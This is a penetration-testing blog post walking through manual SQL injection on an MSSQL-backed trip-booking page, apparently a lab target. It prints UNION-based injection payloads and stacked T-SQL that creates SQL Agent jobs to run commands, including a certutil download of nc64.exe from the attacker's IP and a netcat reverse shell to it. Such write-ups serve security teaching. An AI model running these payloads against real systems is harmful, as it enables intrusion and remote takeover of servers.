<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Manual SQLi On MSSQL [ Creating Jobs With Mssql ]" /><meta name="author" content="r0b0tG4nG" /><meta property="og:locale" content="en" /><meta name="description" content="A friendly blog platform where i’ll discuss about my findings, tricks and techniques used in compromising targets. Have fun reading i hope you learn something new." /><meta property="og:description" content="A friendly blog platform where i’ll discuss about my findings, tricks and techniques used in compromising targets. Have fun reading i hope you learn something new." /><link rel="canonical" href="https://r0b0tg4ng.github.io//posts/Mssql-Jobs/" /><meta property="og:url" content="https://r0b0tg4ng.github.io//posts/Mssql-Jobs/" /><meta property="og:site_name" content="r0b0tG4nG" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-17T10:18:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Manual SQLi On MSSQL [ Creating Jobs With Mssql ]" /><meta name="twitter:site" content="@r0b0tg4ng" /><meta name="twitter:creator" content="@r0b0tG4nG" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"r0b0tG4nG"},"dateModified":"2022-07-12T11:42:27+00:00","datePublished":"2021-12-17T10:18:00+00:00","description":"A friendly blog platform where i’ll discuss about my findings, tricks and techniques used in compromising targets. Have fun reading i hope you learn something new.","headline":"Manual SQLi On MSSQL [ Creating Jobs With Mssql ]","mainEntityOfPage":{"@type":"WebPage","@id":"https://r0b0tg4ng.github.io//posts/Mssql-Jobs/"},"url":"https://r0b0tg4ng.github.io//posts/Mssql-Jobs/"}</script><title>Manual SQLi On MSSQL [ Creating Jobs With Mssql ] | r0b0tG4nG</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="r0b0tG4nG"><meta name="application-name" content="r0b0tG4nG"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/67085453?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">r0b0tG4nG</a></div><div class="site-subtitle font-italic">The Regular IT Guy <br> | OSCP | OSWA | eCCPTv2 | eWPT</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/r0b0tG4nG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/r0b0tg4ng" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.youtube.com/channel/UCSY-pfwuYspZFlRsO7vBfIQ" aria-label="youtube" > <i class="fab fa-youtube"></i> </a> <a href="" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Manual SQLi On MSSQL [ Creating Jobs With Mssql ]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Manual SQLi On MSSQL [ Creating Jobs With Mssql ]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> r0b0tG4nG </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 17, 2021, 10:18 AM +0000" >Dec 17, 2021<i class="unloaded">2021-12-17T10:18:00+00:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 12, 2022, 7:42 AM -0400" >Jul 12, 2022<i class="unloaded">2022-07-12T11:42:27+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1328 words">7 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534410-1abcfb45-ad47-4adf-b54d-637ea41aedd2.png" alt="image" /></p><p><strong>&gt; Information Gathering</strong><br /></p><p>SQL injection aka <code class="language-plaintext highlighter-rouge">SQLi</code> is a <code class="language-plaintext highlighter-rouge">web security vulnerability</code> that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application’s content or behavior. More information on <a href="https://portswigger.net/web-security/sql-injection"> PortSwigger</a></p><p>On port 80, we can see an amazing web application that’s meant for booking trips. It’s safe to assume that this is a travel agent website where one can book a destination to a desired location. The target website appears to have static webpages except the <code class="language-plaintext highlighter-rouge">book-trip.php</code> page. On this page we are presented with a login form which has 3 fields. <code class="language-plaintext highlighter-rouge">1. Destination</code>, <code class="language-plaintext highlighter-rouge">2. Adults</code> &amp; <code class="language-plaintext highlighter-rouge">3. Children</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534457-64377610-eb21-4c71-9928-693096c1a99f.png" alt="image" /><br /></p><p>In <code class="language-plaintext highlighter-rouge">SQLi</code>, there are few characters that are capable of triggering an error in a database. These characters are <code class="language-plaintext highlighter-rouge">*, ', " &amp; a few others</code>. In this engagement, we will use a single <code class="language-plaintext highlighter-rouge">'</code> quote to test all fields. It’s always best to test one field at a time, so let’s put single quote <code class="language-plaintext highlighter-rouge">'</code> in the <code class="language-plaintext highlighter-rouge">destination field</code> and capture the request in burpsuite for further testing.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534508-19900b99-e551-4608-a2ee-beee590510dd.png" alt="image" /><br /></p><p>Pushing the request to <code class="language-plaintext highlighter-rouge">burpsuite forwarder</code>, and sending the request again, we were able to trigger a <code class="language-plaintext highlighter-rouge">sql error</code>. From the response in burpsuite, the error displayed is <code class="language-plaintext highlighter-rouge">Message: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.</code> &amp; <code class="language-plaintext highlighter-rouge">Message: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near ''.</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534664-ce769aa7-7712-4149-a2bc-cd167c2f1f4c.png" alt="image" /> <br /></p><p>The <code class="language-plaintext highlighter-rouge">destination field</code> is vulnerable to sql injection. To further exploit this vulnerability, we need to find the number of columns on the target. In <code class="language-plaintext highlighter-rouge">SQL</code>, the query <code class="language-plaintext highlighter-rouge">Order by</code> is used to sort the <code class="language-plaintext highlighter-rouge">result-set</code> in <code class="language-plaintext highlighter-rouge">ascending or descending order.</code>. To accomplish this, we will modify the data in our request <code class="language-plaintext highlighter-rouge">destination='+order+by+1+--&amp;adults=1&amp;children=1</code>. Note: we will keep increasing the values till we find the right columns on the target.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534570-aea70b24-8a91-45fe-ac13-d07d9b9cc688.png" alt="image" /><br /></p><p>The target database has <code class="language-plaintext highlighter-rouge">5 columns</code> which can be confirmed from the image above. The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, we need to find one or more columns in the original query results whose data type is, or is compatible with, string data. To test this, we will modify our data <code class="language-plaintext highlighter-rouge">destination='+UNION+SELECT+'a',2,3,4,5+--&amp;adults=1&amp;children=1</code>. We will keep testing until the <code class="language-plaintext highlighter-rouge">alphabets</code> we submitted appears in the webapp response.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534844-8ee75f58-78a8-4472-9045-76a10d0a14a1.png" alt="image" /><br /></p><p>We found the relevant columns that are suitable for retrieving string data. We have all that we need now the next step is to start extracting information from the database. For starters, let’s start with the version of SQL server running on the target. We can achieve this using <code class="language-plaintext highlighter-rouge">destination='+UNION+SELECT+1,'a',(SELECT+@@version),3,4+--&amp;adults=1&amp;children=1</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534862-13fff3f1-d047-4195-ac8d-cf617f3d2807.png" alt="image" /><br /></p><p>We can further enumerate the target database to retrieve information but it’s unfortunate i won’t dive deep into that. For more information on how to enumerate the database manually, you can check at <a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">perspectiverisk</a>. For now, let’s focus on to enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> on the target.<br /></p><p>After trying for some time to enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> manually, i hit a dead-end. I tried all that i know and also followed the steps on both <a href="https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/">mssqltips</a> &amp; <a href="https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e">medium.com</a> as well as few others, i failed. I decided to use the automatic method since i know the injection point, it’s easier to do it with <code class="language-plaintext highlighter-rouge">sqlmap</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534917-09c92a28-6a5c-4cfe-a62b-f43254b458f4.png" alt="image" /><br /></p><p>Using <code class="language-plaintext highlighter-rouge">sqlmap</code> didn’t do any good. I tried bypassing this feature with some few <code class="language-plaintext highlighter-rouge">sqlmap arguments</code> but i still failed. Looking at the screenshot above, sqlmap presented us with this error<br /></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>02:00:34] <span class="o">[</span>WARNING] xp_cmdshell creation failed, probably because sp_OACreate is disabled
<span class="o">[</span>02:00:34] <span class="o">[</span>CRITICAL] unable to proceed without xp_cmdshell
</pre></table></code></div></div><p><br /></p><p><strong>&gt; Creating MSSQL Jobs Through SQLi</strong><br /></p><p>The question is “how do we do this?? is it even possible??”?? The answer is <em>YES</em> it is possible have you heard about <code class="language-plaintext highlighter-rouge">T-SQL</code>?? <code class="language-plaintext highlighter-rouge">T-SQL (Transact-SQL)</code> is a set of programming extensions from <code class="language-plaintext highlighter-rouge">Sybase and Microsoft</code> that add several features to the Structured Query Language (SQL), including transaction control, exception and error handling, row processing and declared variables.</p><p><code class="language-plaintext highlighter-rouge">T-SQL identifiers</code>, meanwhile, are used in all databases, servers, and database objects in SQL Server. These include the following <code class="language-plaintext highlighter-rouge">tables, constraints, stored procedures, views, columns and data types</code>. T-SQL identifiers must each have a <code class="language-plaintext highlighter-rouge">unique name, are assigned when an object is created and are used to identify an object</code>.<br /></p><p>With this information, i looked deeper into assigning <code class="language-plaintext highlighter-rouge">T-SQL identifiers</code> on MSSQL which led to <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-add-jobserver-transact-sql?view=sql-server-ver15">microsoft T-SQL</a> documentation.<br /></p><p>To successfully create a <code class="language-plaintext highlighter-rouge">job</code> in MSSQL using <code class="language-plaintext highlighter-rouge">T-SQL</code>, we need two important arguments. These arguments are <code class="language-plaintext highlighter-rouge">[ @job_id = ] job_id</code> or <code class="language-plaintext highlighter-rouge">[ @job_name = ] 'job_name'</code> &amp; <code class="language-plaintext highlighter-rouge">[ @server_name = ] 'server</code>. <br /></p><blockquote><p>Note: Either job_id or job_name must be specified, but both cannot be specified.</p></blockquote><p><br /></p><p>We have all the information we need but another issue pops up. What’s the issue?? how do i create this without any error?? i googled for samples of <code class="language-plaintext highlighter-rouge">T-SQL Jobs</code> and i came across this website <a href="https://www.mssqltips.com/sqlservertip/3052/simple-way-to-create-a-sql-server-job-using-tsql/">mssqltips</a> which clearly defines a fully functional <code class="language-plaintext highlighter-rouge">T-SQL job</code>. From the sample on this website, i crafted a <code class="language-plaintext highlighter-rouge">T-SQL query</code> to test if i can ping my ipaddress .<br /></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">';EXECUTE AS LOGIN = '</span>daedalus_admin<span class="s1">';USE msdb;EXEC sp_delete_job @job_name = N'</span>testping<span class="s1">';EXEC dbo.sp_add_job @job_name = N'</span>testping<span class="s1">';EXEC sp_add_jobstep @job_name = N'</span>testping<span class="s1">', @step_name = N'</span>ping<span class="s1">', @subsystem = N'</span>cmdexec<span class="s1">', @command = N'</span>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe /c ping <span class="nt">-n</span> 10 10.10.15.25<span class="s1">', @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N'</span>testping<span class="s1">';EXEC dbo.sp_start_job N'</span>testping<span class="s1">';--
</span></pre></table></code></div></div><p><br /></p><p>To identify ping requests, we have to start <code class="language-plaintext highlighter-rouge">tcpdump</code> on my attacker machine to filter <code class="language-plaintext highlighter-rouge">icmp</code> on ipaddress of our network interface. We can achieve this by typing <code class="language-plaintext highlighter-rouge">sudo tcpdump -i tun0 icmp</code> in this case, i am listening on <code class="language-plaintext highlighter-rouge">tun0</code> interface. Send the <code class="language-plaintext highlighter-rouge">testping T-SQL</code> request to the target from burpsuite and i received a ping on my machine.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146534986-13349439-ead1-4a26-9b33-3d01c7d854bc.png" alt="image" /><br /></p><p>If we are able to execute a ping request, then we are two steps away from gaining remote code execution on the target. There are many ways to do this but i will stick to the basic 3:</p><blockquote><ol><li>Create an msfvenom payload, transfer to the target and execute it.<br /><li>Transfer netcat windows binary to the target and execute that for a rev shell<br /><li>Use a powershell one-liner to transfer and execute your nishang-tcp-shell script<br /></ol></blockquote><p>I will use the second method. First grab netcat windows binary from <a href="https://github.com/int0x33/nc.exe/">int0x33 GitHub repo</a>, then craft a new <code class="language-plaintext highlighter-rouge">T-SQL job</code> query to transfer the file from your attacking machine to the target machine.<br /></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">';EXECUTE AS LOGIN = '</span>daedalus_admin<span class="s1">';USE msdb;EXEC sp_delete_job @job_name = N'</span>testping<span class="s1">';EXEC dbo.sp_add_job @job_name = N'</span>testping<span class="s1">';EXEC sp_add_jobstep @job_name = N'</span>testping<span class="s1">', @step_name = N'</span>ping<span class="s1">', @subsystem = N'</span>cmdexec<span class="s1">', @command = N'</span>c:<span class="se">\\</span>windows<span class="se">\\</span>system32<span class="se">\\</span>cmd.exe /c certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.15.25/nc64.exe C:<span class="se">\\</span>Windows<span class="se">\\</span>temp<span class="se">\\</span>nc64.exe<span class="s1">', @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N'</span>testping<span class="s1">';EXEC dbo.sp_start_job N'</span>testping<span class="s1">';--
</span></pre></table></code></div></div><p><br /></p><p>Start python server on the attacking machine using <code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer port number</code> or the py3 method <code class="language-plaintext highlighter-rouge">python3 -m http.server port number</code> then put this <code class="language-plaintext highlighter-rouge">T-SQL</code> query in burpsuite and forward the request once again. It worked i got a hit from the target machine. <code class="language-plaintext highlighter-rouge">Nc64.exe</code> is transferred to <code class="language-plaintext highlighter-rouge">C:\\Windows\\temp\\</code> directory.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146535020-9cff2fb4-4005-45e1-84f1-6d1c2d7067e1.png" alt="image" /><br /></p><p>All we need to do now is to parse our <code class="language-plaintext highlighter-rouge">ipaddress</code> and <code class="language-plaintext highlighter-rouge">port number</code> to <code class="language-plaintext highlighter-rouge">nc64.exe</code> in order to gain a reverse connection to the target machine. As usual we have to modify our <code class="language-plaintext highlighter-rouge">T-SQL</code> query to perform this action. Once done, modify burpsuite data and send request again. <br /></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">';EXECUTE AS LOGIN = '</span>daedalus_admin<span class="s1">';USE msdb;EXEC sp_delete_job @job_name = N'</span>testping<span class="s1">';EXEC dbo.sp_add_job @job_name = N'</span>testping<span class="s1">';EXEC sp_add_jobstep @job_name = N'</span>testping<span class="s1">', @step_name = N'</span>ping<span class="s1">', @subsystem = N'</span>cmdexec<span class="s1">', @command = N'</span>C:<span class="se">\\</span>Windows<span class="se">\\</span>temp<span class="se">\\</span>nc64.exe 10.10.15.25 445 <span class="nt">-e</span> cmd.exe<span class="s1">', @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N'</span>testping<span class="s1">';EXEC dbo.sp_start_job N'</span>testping<span class="s1">';--
</span></pre></table></code></div></div><p><br /></p><p>Whoop Whoop we got a reverse connection to the target machine. I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my <a href="https://www.youtube.com/channel/UCSY-pfwuYspZFlRsO7vBfIQ"> YouTube channel</a> for more contents<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146535039-fc5cc779-43b1-4f0b-83c6-ad7129b54219.png" alt="image" />.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/exploiting/'>Exploiting</a>, <a href='/categories/web-applications/'>Web Applications</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >sql injection</a> <a href="/tags/burpsuite/" class="post-tag no-text-decoration" >burpsuite</a> <a href="/tags/shell/" class="post-tag no-text-decoration" >shell</a> <a href="/tags/xp-cmdshell/" class="post-tag no-text-decoration" >xp_cmdshell</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Manual SQLi On MSSQL [ Creating Jobs With Mssql ] - r0b0tG4nG&url=https://r0b0tg4ng.github.io//posts/Mssql-Jobs/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Manual SQLi On MSSQL [ Creating Jobs With Mssql ] - r0b0tG4nG&u=https://r0b0tg4ng.github.io//posts/Mssql-Jobs/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Manual SQLi On MSSQL [ Creating Jobs With Mssql ] - r0b0tG4nG&url=https://r0b0tg4ng.github.io//posts/Mssql-Jobs/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/OSWA/">My OSWA Journey - New Age Begins</a><li><a href="/posts/Mssql-Jobs/">Manual SQLi On MSSQL [ Creating Jobs With Mssql ]</a><li><a href="/posts/OSCP/">My OSCP Journey - The Untold Story</a><li><a href="/posts/Exploiting-Jfrog-Artifactory/">Exploiting Jfrog Artifactory [ Server-side Request Forgery ]</a><li><a href="/posts/Exploiting-RocketChat/">Exploiting RocketChat [ Message Dump To RCE ]</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/exploit-db/">exploit-db</a> <a class="post-tag" href="/tags/hydra/">hydra</a> <a class="post-tag" href="/tags/burpsuite/">burpsuite</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/xp-cmdshell/">xp_cmdshell</a> <a class="post-tag" href="/tags/echoctf/">EchoCTF</a> <a class="post-tag" href="/tags/hack-the-box/">Hack the box</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a> <a class="post-tag" href="/tags/msfconsole/">msfconsole</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Abusing-MSSQL-Linked-Servers/"><div class="card-body"> <span class="timeago small" >Dec 16, 2021<i class="unloaded">2021-12-16T10:18:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Abusing MSSQL Linked Servers [ Adding SA User & File Read ]</h3><div class="text-muted small"><p> &gt; Information Gathering Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of sto...</p></div></div></a></div><div class="card"> <a href="/posts/Kerberoasting-Using-Mssql-Server/"><div class="card-body"> <span class="timeago small" >Jan 13, 2022<i class="unloaded">2022-01-13T13:33:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Kerberoasting Using Mssql Server [ Abusing GenericAll ]</h3><div class="text-muted small"><p> &gt; Information Gathering From The previous writeup on Abusing MSSQL Linked Servers, we found credentials on the target. In this chapter, we will look at how we can perform kerberoast attacks ...</p></div></div></a></div><div class="card"> <a href="/posts/Exploiting-Jfrog-Artifactory/"><div class="card-body"> <span class="timeago small" >Jan 14, 2022<i class="unloaded">2022-01-14T21:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Exploiting Jfrog Artifactory [ Server-side Request Forgery ]</h3><div class="text-muted small"><p> &gt; Information Gathering From nmap scan, we found a web app running on port 8081. Navigating to port 8081 on the browser, we discovered Jfrog Artifactory running on the target and we were re...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Abusing-MSSQL-Linked-Servers/" class="btn btn-outline-primary" prompt="Older"><p>Abusing MSSQL Linked Servers [ Adding SA User & File Read ]</p></a> <a href="/posts/Kerberoasting-Using-Mssql-Server/" class="btn btn-outline-primary" prompt="Newer"><p>Kerberoasting Using Mssql Server [ Abusing GenericAll ]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/r0b0tg4ng">Saeed Bala Ahmed</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/exploit-db/">exploit db</a> <a class="post-tag" href="/tags/hydra/">hydra</a> <a class="post-tag" href="/tags/burpsuite/">burpsuite</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/xp-cmdshell/">xp_cmdshell</a> <a class="post-tag" href="/tags/echoctf/">EchoCTF</a> <a class="post-tag" href="/tags/hack-the-box/">Hack the box</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket mssqlclient</a> <a class="post-tag" href="/tags/msfconsole/">msfconsole</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return 